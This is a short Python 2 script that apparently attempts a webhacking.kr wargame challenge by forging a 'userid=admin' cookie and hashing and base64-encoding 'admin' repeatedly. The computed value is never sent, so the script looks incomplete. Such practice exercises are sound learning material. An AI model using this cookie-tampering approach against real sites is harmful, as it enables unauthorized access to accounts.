import requests
import md5, base64

text='admin'
admin=''
for i in xrange(5):  
  arg=md5.new()
  arg.update(text[i])
  admin+= arg.hexdigest() 
print admin
for _ in xrange(11):
  admin= base64.b64encode(admin)

#print admin
url='http://webhacking.kr/challenge/javascript/js6.html?id=admin'
cookies={'userid':'admin','PHPSESSID':'pve7unig3qesfdjskbtl7emn63'}
payload =''
response=requests.post(url,data=payload,cookies=cookies)

print response.text
url='http://webhacking.kr/challenge/javascript/js6.html'
response=requests.get(url,cookies=cookies)
print response.text